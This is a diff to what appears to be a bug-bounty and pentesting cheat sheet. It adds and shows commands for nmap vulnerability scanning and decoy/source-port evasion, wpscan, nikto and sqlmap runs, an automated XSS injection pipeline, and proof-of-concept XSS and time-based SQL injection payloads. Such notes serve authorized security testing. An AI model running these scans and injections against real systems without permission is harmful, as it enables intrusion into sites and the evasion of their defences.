@@ -70,11 +70,12 @@ site.com/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27locat
 Automatic scanners 
 1- nuclei 	=> nuclei -df httpx.txt -t /home/nuclei-templates -o nucleioutput
 2- whatweb --no-errors 10.10.10.0/24
-3-wpscan =>  Wpscan --url https://site.com/wordpress -e at -e ap -e u
+3-wpscan =>  Wpscan --url https://site.com/wordpress -e at -e ap -e u	--api-token ----------------
 4- echo subdomains.txt | httpx --silent | nuclei -t php8-dev-rce.yaml
 5- cat hosts.txt | while read host do; do curl -s -k --insecure "$host/secure/ViewUserHover.jspa"|grep -qsi "User does not exist"&&
 \printf "$host\033[0;31mVulnerable\n"||printf "$host \033[0;32mNot Vulnerable\n";done
-6- 
+6- nikto -h https://site.com
+7- 
 ------------------------------------------------------------------------------------------------------
 Subdomain takeover 
 1- use Subjack => https://github.com/haccer/subjack
@@ -136,6 +137,14 @@ Nmap
     $ nmap -sV --script=http-enum <target> -p 80,443,8000,8080
     $ ncat -nv --source-port 53 10.129.2.28 50000	==>>  Connect To The Filtered Port 
     $nmap -D RND:8     192.199.112.22	--source-port 53	=> to use random ip for sourcse 
+cd /usr/share/nmap/scripts/
+wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
+nmap -sS -sV --script=vulscan/vulscan.nse target
+nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
+nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
+nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target
+nmap -sV --script=vuln target
+nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target
     
 --------------------------------------------------------------------------------------------------
 Directory Enumeration 
@@ -470,6 +479,7 @@ cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|p
 	-ALLOWED: xyz"/ng-click="constructor.constructor('alert(1)')()
 	-Payload:  <iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>  
 	-Payload: %7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D
+14-   29- echo http://vulnweb.com | subfinder -silent | httpx -silent | katana -d 10 -silent | gf xss | Gxss -c 100 -p XssReflected | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
 
 -----------------------------------------------------------------------------------------------------------------------------------------------
 Signup
@@ -864,7 +874,9 @@ Hidden params
 --------------------------------------------------------------------------------------------------------------------------------------------------------
 SQLI 
 1- collect all urls with waybackurl , gau , hackcrawler in urls.txt
-	- gf sqli urls.txt >> allsqli.txt	=> gf patterns => https://github.com/1ndianl33t/Gf-Patterns
+	- gf sqli urls.txt >> allsqli.txt	=> gf patterns => https://github.com/1ndianl33t/Gf-Patterns	gf patterns ==> git clone https://github.com/1ndianl33t/Gf-Patterns
+            mkdir .gf
+            mv ~/Gf-Patterns/*.json ~/.gf
 		gf tool => https://github.com/1ndianl33t/Gf-Patterns
 	- sqlmap -m allsqli.txt --dbs --batch 
 
@@ -892,6 +904,7 @@ SQLI
 
 10- Parameter=randomtext%' OR SLEEP (5) #
 
+11- sqlmap -r request.txt --ignore-code 401
 
 
 
@@ -1001,11 +1014,12 @@ tools:
 -------------------------------------------------------------------------------------------------------
 Httpx 
 
+ cat iplist| httpx -silent -path /xmlrpc.php -title -match-string "XML-RPC" ==> then search exploit xmlrpc
 -------------------------------------------------------------------------------------------------------
 Burpsuite
 1-search for =>  Request.Query CONTAINS "=https"	==> for open redirect 
 2- Using Autorize 
-3- 
+3- open burpsuite and send to intruder and $GET$ then select payloads from library => http verbs
 
 --------------------------------------------------------------------------------------------------
 JWT
